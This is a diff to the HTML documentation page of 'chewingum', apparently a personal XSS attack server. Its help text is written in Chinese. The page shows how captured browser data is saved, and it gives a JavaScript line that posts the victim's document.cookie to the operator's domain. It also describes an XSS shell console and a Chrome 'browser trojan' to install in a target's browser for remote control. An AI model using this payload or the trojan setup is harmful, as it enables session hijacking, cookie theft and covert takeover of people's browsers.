@@ -32,12 +32,12 @@
     <div id="main_content_wrap" class="outer">
       <section id="main_content" class="inner">
         <h1>
-<a name="chewingum-alpha021140214" class="anchor" href="#chewingum-alpha021140214"><span class="octicon octicon-link"></span></a>Chewingum [alpha][0.2][1140214]</h1>
+<a name="chewingum-alpha02011140429" class="anchor" href="#chewingum-alpha02011140429"><span class="octicon octicon-link"></span></a>Chewingum [alpha][0.201][1140429]</h1>
 
 <h2>
 <a name="name" class="anchor" href="#name"><span class="octicon octicon-link"></span></a>Name</h2>
 
-<p><strong>chewingum - individual XSS server framework</strong></p>
+<p><strong>chewingum - individual XSS server</strong></p>
 
 <h2>
 <a name="startup" class="anchor" href="#startup"><span class="octicon octicon-link"></span></a>Startup</h2>
@@ -50,7 +50,7 @@ python ./chewingum.py [ -h | host port debug ]
 <a name="dependencies" class="anchor" href="#dependencies"><span class="octicon octicon-link"></span></a>Dependencies</h2>
 
 <ul>
-<li><a href="http://bottlepy.org/">Bottle-0.11</a></li>
+<li><a href="http://bottlepy.org/">Bottle-0.12</a></li>
 <li><a href="https://github.com/zeekay/bottle-websocket/">Bottle-websocket</a></li>
 <li>
 <p><a href="http://sdiehl.github.io/gevent-tutorial/">GeventWebSocketServer</a></p>
@@ -72,13 +72,13 @@ python ./chewingum.py [ -h | host port debug ]
 </ul><h2>
 <a name="helptext" class="anchor" href="#helptext"><span class="octicon octicon-link"></span></a>Helptext</h2>
 
-<ul>
-<li>1.login</li>
-</ul><p>采用filekey验证, 上传filekey或输入URL便可登录.</p>
+<p><em>1.login</em></p>
 
-<ul>
-<li>2.server</li>
-</ul><p>server处代码会直接在项目触发时执行,<br>
+<p>采用filekey验证, 上传filekey或输入URL便可登录.</p>
+
+<p><em>2.server</em></p>
+
+<p>server处代码会直接在项目触发时执行,<br>
 最终会将变量serverinfo和变量browserinfo保存至数据库,<br>
 格式需为json/dict格式</p>
 
@@ -96,9 +96,9 @@ browserinfo = {
 }
 </code></pre>
 
-<ul>
-<li>3.server code keyword</li>
-</ul><p>iferror<br>
+<p><em>3.server code keyword</em></p>
+
+<p>iferror<br>
 对变量iferror赋值, 会触发对应错误.<br>
 如:</p>
 
@@ -122,17 +122,17 @@ browserinfo = {
 <p>gum.backinfo = {};</p>
 </blockquote>
 
-<ul>
-<li>4.project name and object name</li>
-</ul><p>project 的项目名需是xss触发处的url或是domain.<br>
+<p><em>4.project name and object name</em></p>
+
+<p>project 的项目名需是xss触发处的url或是domain.<br>
 $default是默认项目, xss触发时若未发现对应项目则按照此配置进行.</p>
 
 <pre><code>object 的项目名可随意更改.
 </code></pre>
 
-<ul>
-<li>5.plugins</li>
-</ul><p>可以这样导入server扩展,</p>
+<p><em>5.plugins</em></p>
+
+<p>可以这样导入server扩展,</p>
 
 <pre><code>with open('./plus/get_info.py') as files: exec files.read()
 </code></pre>
@@ -170,9 +170,9 @@ send_mail(gum_emailremind)
 }
 </code></pre>
 
-<ul>
-<li>6.set code</li>
-</ul><p>这样发送browser info,</p>
+<p><em>6.set code</em></p>
+
+<p>这样发送browser info,</p>
 
 <pre><code>gum.post('http://' + gum.domain + '/ing', {'cookie':document.cookie})
 </code></pre>
@@ -191,9 +191,10 @@ browserinfo = b64encode(sessionid.get(referer))
 </code></pre>
 
 <ul>
-<li><p>不推荐使用多次接收，默认已关闭。</p></li>
-<li><p>7.other</p></li>
-</ul><p>使用基本探针:</p>
+<li>      不推荐使用多次接收，默认已关闭。</li>
+</ul><p><em>7.other</em></p>
+
+<p>使用基本探针:</p>
 
 <p>server:</p>
 
@@ -208,18 +209,18 @@ browserinfo = b64encode(sessionid.get(referer))
 })
 </code></pre>
 
-<ul>
-<li>8.console</li>
-</ul><p>javascript文件在</p>
+<p><em>8.console</em></p>
+
+<p>javascript文件在</p>
 
 <pre><code>./static/plus/onexsshell.js
-
-尚在测试阶段。
 </code></pre>
 
-<ul>
-<li>9.browser trojan</li>
-</ul><p>chrome<br>
+<p>尚在测试阶段。</p>
+
+<p><em>9.browser trojan</em></p>
+
+<p>chrome<br>
 修改./trojan/chrome/gum.js中的{{domain}}为你的chewingum的域名及端口<br>
 使用chrome or chromium打包<br>
 安装在目标的浏览器后，使用console即可操作目标浏览器。  </p>
@@ -237,7 +238,17 @@ browserinfo = b64encode(sessionid.get(referer))
       </footer>
     </div>
 
-    
+              <script type="text/javascript">
+            var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+            document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+          </script>
+          <script type="text/javascript">
+            try {
+              var pageTracker = _gat._getTracker("Gum, XSS");
+            pageTracker._trackPageview();
+            } catch(err) {}
+          </script>
+
 
   </body>
 </html>
